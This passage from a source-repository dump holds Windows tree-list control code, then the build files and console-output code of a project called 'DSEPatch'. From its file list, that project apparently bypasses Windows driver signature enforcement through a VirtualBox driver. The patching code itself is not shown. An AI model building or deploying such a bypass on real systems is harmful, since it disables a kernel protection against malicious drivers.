        return SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_EXPAND, wParam, lParam);

    case TVM_SETIMAGELIST:

        return SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_SETIMAGELIST, wParam, lParam);

    case TVM_DELETEITEM:

        if (lParam == (LPARAM)TVI_ROOT) {
            SendMessage((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT), TVM_DELETEITEM, 0, (LPARAM)TVI_ROOT);

            hheap = (HANDLE)GetWindowLongPtr(hwnd, TL_HEAP_SLOT);
            SetWindowLongPtr(hwnd, TL_HEAP_SLOT, 0);
            HeapDestroy(hheap);

            hheap = HeapCreate(0, 0, 0);
            if (hheap == NULL)
                return FALSE;

            SetWindowLongPtr(hwnd, TL_HEAP_SLOT, (LONG_PTR)hheap);
            SetWindowLongPtr(hwnd, TL_TOOLTIPSBUFFER_SLOT, (LONG_PTR)HeapAlloc(hheap, 0, TL_SIZEOF_PRIVATEBUFFER));

            return TRUE;
        }
        break;

    case WM_CONTEXTMENU:

        TreeControl = (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT);
        lhti.flags = 0;
        lhti.hItem = NULL;
        lhti.pt.x = GET_X_LPARAM(lParam);
        lhti.pt.y = GET_Y_LPARAM(lParam);
        ScreenToClient(TreeControl, &lhti.pt);
        TreeView_HitTest(TreeControl, &lhti);
        if (lhti.hItem)
            TreeView_SelectItem(TreeControl, lhti.hItem);

        return SendMessage(GetParent(hwnd), WM_CONTEXTMENU, wParam, lParam);

    case WM_NOTIFY:

        hdr = (LPNMHEADER)lParam;
        HeaderControl = (HWND)GetWindowLongPtr(hwnd, TL_HEADERCONTROL_SLOT);
        TreeControl = (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT);

        if (hdr->hdr.hwndFrom == TreeControl) {
            switch (hdr->hdr.code) {
            case NM_CUSTOMDRAW:
                return TreeListCustomDraw(HeaderControl, (LPNMTVCUSTOMDRAW)lParam);

            case TVN_ITEMEXPANDED:
                if ((((LPNMTREEVIEW)lParam)->action == TVE_EXPAND) && (GetWindowLongPtr(hwnd, GWL_STYLE) & TLSTYLE_COLAUTOEXPAND))
                    TreeListAutoExpand(HeaderControl, (LPNMTREEVIEW)lParam);
                TreeListUpdateTooltips(hwnd);
                break;

            default:
                return SendMessage(GetParent(hwnd), uMsg, wParam, lParam);
            }
            /* break to DefWindowProc */
            break;
        }

        if (hdr->hdr.hwndFrom == HeaderControl) {
            switch (hdr->hdr.code) {
            case HDN_ITEMCHANGED:
                TreeListHandleHeaderNotify(hwnd, TreeControl, HeaderControl);
                break;
            case HDN_ITEMCHANGING:
                if (((hdr->pitem->mask & HDI_WIDTH) != 0) && (hdr->iItem == 0) && (hdr->pitem->cxy < 120))
                    return TRUE;
                break;
            }
        }
        break;

    case WM_HSCROLL:

        TreeControl = (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT);
        HeaderControl = (HWND)GetWindowLongPtr(hwnd, TL_HEADERCONTROL_SLOT);

        GetWindowRect(HeaderControl, &hr);
        headerheight = hr.bottom - hr.top;

        RtlSecureZeroMemory(&scroll, sizeof(scroll));
        scroll.cbSize = sizeof(scroll);
        scroll.fMask = SIF_ALL;
        GetScrollInfo(hwnd, SB_HORZ, &scroll);

        scroll.fMask = SIF_ALL;
        cx = scroll.nMax - scroll.nPage;

        switch (LOWORD(wParam)) {
        case SB_LINELEFT:
            scroll.nPos -= 16;
            break;
        case SB_LINERIGHT:
            scroll.nPos += 16;
            break;
        case SB_THUMBTRACK:
            scroll.nPos = scroll.nTrackPos;
            break;
        case SB_PAGELEFT:
            scroll.nPos -= cx;
            break;
        case SB_PAGERIGHT:
            scroll.nPos += cx;
            break;
        }

        if (scroll.nPos < 0)
            scroll.nPos = 0;
        if (scroll.nPos > cx)
            scroll.nPos = cx;

        SetScrollInfo(hwnd, SB_HORZ, &scroll, TRUE);
        SetWindowPos(HeaderControl, 0, -scroll.nPos, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
        GetClientRect(hwnd, &hr);
        MoveWindow(TreeControl, -scroll.nPos, headerheight, hr.right + scroll.nPos, hr.bottom - headerheight, TRUE);
        break;

    case WM_SETFOCUS:
        SetFocus((HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT));
        break;

    case WM_SIZE:
        HeaderControl = (HWND)GetWindowLongPtr(hwnd, TL_HEADERCONTROL_SLOT);
        TreeControl = (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT);

        GetWindowRect(HeaderControl, &hr);
        headerheight = hr.bottom - hr.top;

        RtlSecureZeroMemory(&scroll, sizeof(scroll));
        scroll.cbSize = sizeof(scroll);
        scroll.fMask = SIF_ALL;
        GetScrollInfo(hwnd, SB_HORZ, &scroll);

        GetClientRect(hwnd, &hr);
        MoveWindow(HeaderControl, -scroll.nPos, 0, hr.right + scroll.nPos, headerheight, TRUE);
        MoveWindow(TreeControl, -scroll.nPos, headerheight, hr.right + scroll.nPos, hr.bottom - headerheight, TRUE);
        return 0;

    case WM_CREATE:
        hheap = HeapCreate(0, 0, 0);
        if (hheap == NULL)
            return -1;

        RtlSecureZeroMemory(&hr, sizeof(hr));
        GetClientRect(hwnd, &hr);

        RtlSecureZeroMemory(&ncm, sizeof(ncm));
        ncm.cbSize = sizeof(ncm) - sizeof(int);
        if (SystemParametersInfo(SPI_GETNONCLIENTMETRICS, sizeof(ncm) - sizeof(int), &ncm, 0)) {
            font = CreateFontIndirect(&ncm.lfMenuFont);
            cx = ncm.iCaptionHeight;
        }
        else {
            font = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
            cx = 20;
        }

        HeaderControl = CreateWindowEx(0, WC_HEADER, NULL,
            WS_VISIBLE | WS_CHILD | HDS_FULLDRAG, 0, 0, hr.right, cx, hwnd, NULL, NULL, NULL);
        TreeControl = CreateWindowEx(0, WC_TREEVIEW, NULL,
            WS_VISIBLE | WS_CHILD | TVS_NOHSCROLL | TVS_HASBUTTONS | TVS_LINESATROOT | TVS_FULLROWSELECT | TVS_NOTOOLTIPS | TVS_SHOWSELALWAYS,
            0, cx, hr.right, hr.bottom - cx, hwnd, NULL, NULL, NULL);

        ToolTip = CreateWindowEx(WS_EX_TRANSPARENT | WS_EX_TOPMOST, TOOLTIPS_CLASS, NULL, TTS_NOPREFIX, 0, 0, 0, 0, hwnd, NULL, NULL, NULL);
        SendMessage(ToolTip, TTM_SETDELAYTIME, TTDT_INITIAL, 0);
        SendMessage(ToolTip, TTM_SETDELAYTIME, TTDT_RESHOW, 0);

        /*hooks*/
        SetWindowLongPtr(hwnd, TL_TREEWNDPROC_SLOT,
            /*old wndproc here*/
            SetWindowLongPtr(TreeControl, GWLP_WNDPROC, (LONG_PTR)&TreeListHookProc));

        SetWindowLongPtr(hwnd, TL_HEADERWNDPROC_SLOT,
            /*old wndproc here*/
            SetWindowLongPtr(HeaderControl, GWLP_WNDPROC, (LONG_PTR)&HeaderHookProc));

        SendMessage(TreeControl, TVM_SETEXTENDEDSTYLE, TVS_EX_DOUBLEBUFFER, TVS_EX_DOUBLEBUFFER);
        SendMessage(HeaderControl, WM_SETFONT, (WPARAM)font, TRUE);
        SetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT, (LONG_PTR)TreeControl);
        SetWindowLongPtr(hwnd, TL_HEADERCONTROL_SLOT, (LONG_PTR)HeaderControl);
        SetWindowLongPtr(hwnd, TL_HEAP_SLOT, (LONG_PTR)hheap);
        SetWindowLongPtr(hwnd, TL_TOOLTIPS_SLOT, (LONG_PTR)ToolTip);
        SetWindowLongPtr(hwnd, TL_TOOLTIPSBUFFER_SLOT, (LONG_PTR)HeapAlloc(hheap, 0, TL_SIZEOF_PRIVATEBUFFER));

        SetWindowTheme(TreeControl, TEXT("Explorer"), NULL);
        SetWindowTheme(HeaderControl, TEXT("Explorer"), NULL);

        if (tl_theme == NULL)
            tl_theme = OpenThemeData(TreeControl, VSCLASS_TREEVIEW);

        break;

    case WM_DESTROY:
        DestroyWindow((HWND)GetWindowLongPtr(hwnd, TL_TOOLTIPS_SLOT));
        HeapDestroy((HANDLE)GetWindowLongPtr(hwnd, TL_HEAP_SLOT));
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

ATOM InitializeTreeListControl()
{
    WNDCLASSEX  wincls;
    HINSTANCE   hinst = GetModuleHandle(NULL);

    wincls.cbSize = sizeof(WNDCLASSEX);
    wincls.style = 0;
    wincls.lpfnWndProc = &TreeListWindowProc;
    wincls.cbClsExtra = 0;
    wincls.cbWndExtra = sizeof(HANDLE) * 16;
    wincls.hInstance = hinst;
    wincls.hIcon = NULL;
    wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
    wincls.hbrBackground = NULL;
    wincls.lpszMenuName = NULL;
    wincls.lpszClassName = WC_TREELIST;
    wincls.hIconSm = 0;

    return RegisterClassEx(&wincls);
}

```

`source/ApiSetSchema/treelist.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       TREELIST.H
*
*  VERSION:     1.27
*
*  DATE:        31 Mar 2019
*
*  Tree-List custom control header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#define WC_TREELISTA            "CustomTreeList"
#define WC_TREELISTW            L"CustomTreeList"

#ifdef UNICODE
#define WC_TREELIST             WC_TREELISTW
#else
#define WC_TREELIST             WC_TREELISTA
#endif

#define TL_TREECONTROL_SLOT		0
#define TL_HEADERCONTROL_SLOT	sizeof(HANDLE)
#define TL_TREEWNDPROC_SLOT		sizeof(HANDLE)*2
#define TL_HEAP_SLOT			sizeof(HANDLE)*3
#define TL_TOOLTIPS_SLOT		sizeof(HANDLE)*4
#define TL_TOOLTIPSBUFFER_SLOT	sizeof(HANDLE)*5
#define TL_HEADERWNDPROC_SLOT	sizeof(HANDLE)*6

#define TL_SIZEOF_PRIVATEBUFFER	(sizeof(TCHAR) * (MAX_PATH + 1))

#define TLF_BGCOLOR_SET			0x01
#define TLF_FONTCOLOR_SET		0x02

#define TLSTYLE_COLAUTOEXPAND	0x01
#define TLSTYLE_LINKLINES       0x02

typedef struct _TL_SUBITEMS {
    ULONG		ColorFlags;
    COLORREF	BgColor;
    COLORREF	FontColor;
    PVOID       UserParam;
    ULONG		Count;
    LPTSTR		Text[1];
} TL_SUBITEMS, *PTL_SUBITEMS;

ATOM InitializeTreeListControl();

#define TreeList_GetTreeControlWindow(hwnd) \
    (HWND)GetWindowLongPtr(hwnd, TL_TREECONTROL_SLOT)

#define TreeList_GetTreeItem(hwnd, lpitem, subitems) \
    (BOOL)SNDMSG((hwnd), TVM_GETITEM, (WPARAM)(LPTVITEMEX)(lpitem), (LPARAM)(PTL_SUBITEMS *)(subitems))

#define TreeList_SetTreeItem(hwnd, lpitem, subitems) \
    (BOOL)SNDMSG((hwnd), TVM_SETITEM, (WPARAM)(LPTVITEMEX)(lpitem), (LPARAM)(PTL_SUBITEMS *)(subitems))

#define TreeList_InsertTreeItem(hwnd, lpis, subitems) \
    (HTREEITEM)SNDMSG((hwnd), TVM_INSERTITEM, (WPARAM)(LPTV_INSERTSTRUCT)(lpis), (LPARAM)(PTL_SUBITEMS)(subitems))

#define TreeList_InsertHeaderItem(hwndHD, i, phdi) \
    (int)SNDMSG((hwndHD), HDM_INSERTITEM, (WPARAM)(int)(i), (LPARAM)(const HD_ITEM *)(phdi))

#define TreeList_ClearTree(hwnd) \
    (BOOL)SNDMSG((hwnd), TVM_DELETEITEM, 0, (LPARAM)TVI_ROOT)

#define TreeList_Expand(hwnd, hitem, code) \
    (BOOL)SNDMSG((hwnd), TVM_EXPAND, (WPARAM)(code), (LPARAM)(HTREEITEM)(hitem))

#define TreeList_GetSelection(hwnd) \
    (HTREEITEM)SNDMSG((hwnd), TVM_GETNEXTITEM, TVGN_CARET, 0)

#define TreeList_EnsureVisible(hwnd, hitem) \
    (BOOL)SNDMSG((hwnd), TVM_ENSUREVISIBLE, 0, (LPARAM)(HTREEITEM)(hitem))

#define TreeList_GetRoot(hwnd) \
    (HTREEITEM)SNDMSG((hwnd), TVM_GETNEXTITEM, TVGN_ROOT, 0)

#define TreeList_GetNextItem(hwnd, hitem, code) \
    (HTREEITEM)SNDMSG((hwnd), TVM_GETNEXTITEM, (WPARAM)(code), (LPARAM)(HTREEITEM)(hitem))

#define TreeList_SetImageList(hwnd, himl, iImage) \
    (HIMAGELIST)SNDMSG((hwnd), TVM_SETIMAGELIST, iImage, (LPARAM)(HIMAGELIST)(himl))

#define TreeList_GetChild(hwnd, hitem)          TreeList_GetNextItem(hwnd, hitem, TVGN_CHILD)
#define TreeList_GetNextSibling(hwnd, hitem)    TreeList_GetNextItem(hwnd, hitem, TVGN_NEXT)


```

`source/DSEPatch/DSEPatch.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.271
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DSEPatch", "DSEPatch\DSEPatch.vcxproj", "{75CEED88-EA4C-4F16-AC88-5F223AAB0591}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{75CEED88-EA4C-4F16-AC88-5F223AAB0591}.Debug|x64.ActiveCfg = Debug|x64
		{75CEED88-EA4C-4F16-AC88-5F223AAB0591}.Debug|x64.Build.0 = Debug|x64
		{75CEED88-EA4C-4F16-AC88-5F223AAB0591}.Release|x64.ActiveCfg = Release|x64
		{75CEED88-EA4C-4F16-AC88-5F223AAB0591}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {903A1DAC-7E4E-4237-BA77-08CB08936EA9}
	EndGlobalSection
EndGlobal

```

`source/DSEPatch/DSEPatch/DSEPatch.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{75CEED88-EA4C-4F16-AC88-5F223AAB0591}</ProjectGuid>
    <RootNamespace>DSEPatch</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <IncludePath>$(ProjectDir);$(IncludePath)</IncludePath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <IncludePath>$(ProjectDir);$(IncludePath)</IncludePath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <BufferSecurityCheck>
      </BufferSecurityCheck>
    </ClCompile>
    <Link>
      <EntryPointSymbol>main</EntryPointSymbol>
      <SubSystem>Console</SubSystem>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>
      </BufferSecurityCheck>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <EntryPointSymbol>main</EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
      <SubSystem>Console</SubSystem>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="cui\cui.c" />
    <ClCompile Include="hde\hde64.c" />
    <ClCompile Include="instdrv.c" />
    <ClCompile Include="main.c" />
    <ClCompile Include="minirtl\cmdline.c" />
    <ClCompile Include="minirtl\u64tohex.c" />
    <ClCompile Include="minirtl\ultohex.c" />
    <ClCompile Include="minirtl\ultostr.c" />
    <ClCompile Include="minirtl\_strcat.c" />
    <ClCompile Include="minirtl\_strcmpi.c" />
    <ClCompile Include="minirtl\_strcpy.c" />
    <ClCompile Include="minirtl\_strend.c" />
    <ClCompile Include="minirtl\_strlen.c" />
    <ClCompile Include="minirtl\_strncmp.c" />
    <ClCompile Include="minirtl\_strncmpi.c" />
    <ClCompile Include="minirtl\_strncpy.c" />
    <ClCompile Include="sup.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="cui\cui.h" />
    <ClInclude Include="global.h" />
    <ClInclude Include="hde\hde64.h" />
    <ClInclude Include="hde\pstdint.h" />
    <ClInclude Include="hde\table64.h" />
    <ClInclude Include="instdrv.h" />
    <ClInclude Include="minirtl\cmdline.h" />
    <ClInclude Include="minirtl\minirtl.h" />
    <ClInclude Include="minirtl\rtltypes.h" />
    <ClInclude Include="ntdll\ntos.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="se_patterns.h" />
    <ClInclude Include="sup.h" />
    <ClInclude Include="vbox.h" />
    <ClInclude Include="vboxdrv.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/DSEPatch/DSEPatch/DSEPatch.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{b7dc2afc-5ac8-4182-ae62-6405b4ebc974}</UniqueIdentifier>
    </Filter>
    <Filter Include="hde">
      <UniqueIdentifier>{54489fba-baa0-4c59-b2bf-19a41fcc1479}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strncmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strncpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\u64tohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\ultohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\ultostr.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="hde\hde64.c">
      <Filter>hde</Filter>
    </ClCompile>
    <ClCompile Include="sup.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="cui\cui.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="instdrv.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strncmp.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\cmdline.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="global.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\minirtl.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\rtltypes.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="ntdll\ntos.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="hde\hde64.h">
      <Filter>hde</Filter>
    </ClInclude>
    <ClInclude Include="hde\pstdint.h">
      <Filter>hde</Filter>
    </ClInclude>
    <ClInclude Include="hde\table64.h">
      <Filter>hde</Filter>
    </ClInclude>
    <ClInclude Include="sup.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="vbox.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="vboxdrv.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="cui\cui.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="se_patterns.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="instdrv.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\cmdline.h">
      <Filter>minirtl</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>
```

`source/DSEPatch/DSEPatch/DSEPatch.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LocalDebuggerCommandArguments>
    </LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>-r</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`source/DSEPatch/DSEPatch/cui/cui.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       CUI.C
*
*  VERSION:     1.30
*
*  DATE:        01 Aug 2018
*
*  Console output.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

HANDLE g_ConOut = NULL, g_ConIn = NULL;
BOOL   g_ConsoleOutput = FALSE;
WCHAR  g_BE = 0xFEFF;

/*
* cuiInitialize
*
* Purpose:
*
* Initialize console input/output.
*
*/
VOID cuiInitialize(
    _In_ BOOL InitInput,
    _Out_opt_ PBOOL IsConsoleOutput
)
{
    ULONG dummy;

    g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (InitInput) g_ConIn = GetStdHandle(STD_INPUT_HANDLE);

    SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);

    g_ConsoleOutput = TRUE;
    if (!GetConsoleMode(g_ConOut, &dummy)) {
        g_ConsoleOutput = FALSE;
        WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &dummy, NULL);
    }

    if (IsConsoleOutput)
        *IsConsoleOutput = g_ConsoleOutput;

    return;
}

/*
* cuiClrScr
*
* Purpose:
*
* Clear screen.
*
*/
VOID cuiClrScr(
    VOID
)
{
    COORD coordScreen;
    DWORD cCharsWritten;
    DWORD dwConSize;
    CONSOLE_SCREEN_BUFFER_INFO csbi;

    coordScreen.X = 0;
    coordScreen.Y = 0;

    if (!GetConsoleScreenBufferInfo(g_ConOut, &csbi))
        return;

    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

    if (!FillConsoleOutputCharacter(g_ConOut, TEXT(' '),
        dwConSize, coordScreen, &cCharsWritten))
        return;

    if (!GetConsoleScreenBufferInfo(g_ConOut, &csbi))
        return;

    if (!FillConsoleOutputAttribute(g_ConOut, csbi.wAttributes,
        dwConSize, coordScreen, &cCharsWritten))
        return;

    SetConsoleCursorPosition(g_ConOut, coordScreen);
}

/*
* cuiPrintTextA
*
* Purpose:
*
* Output text to the console or file.
* ANSI version.
*
*/
VOID cuiPrintTextA(
    _In_ LPSTR lpText,
    _In_ BOOL UseReturn
)
{
    SIZE_T consoleIO;
    DWORD bytesIO;
    LPSTR Buffer;

    if (lpText == NULL)
        return;

    consoleIO = _strlen_a(lpText);
    if ((consoleIO == 0) || (consoleIO > MAX_PATH * 4))
        return;

    consoleIO = 5 + consoleIO;
    Buffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, consoleIO);
    if (Buffer) {

        _strcpy_a(Buffer, lpText);
        if (UseReturn) _strcat_a(Buffer, "\r\n");

        consoleIO = _strlen_a(Buffer);

        if (g_ConsoleOutput != FALSE) {
            WriteConsoleA(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
        }
        else {
            WriteFile(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
        }
        HeapFree(GetProcessHeap(), 0, Buffer);
    }
}

/*
* cuiPrintTextW
*
* Purpose:
*
* Output text to the console or file.
* UNICODE version.
*
*/
VOID cuiPrintTextW(
	_In_ LPWSTR lpText,
	_In_ BOOL UseReturn
	)
{
	SIZE_T consoleIO;
	DWORD bytesIO;
	LPWSTR Buffer;

	if (lpText == NULL)
		return;

	consoleIO = _strlen_w(lpText);
	if ((consoleIO == 0) || (consoleIO > MAX_PATH * 4))
		return;

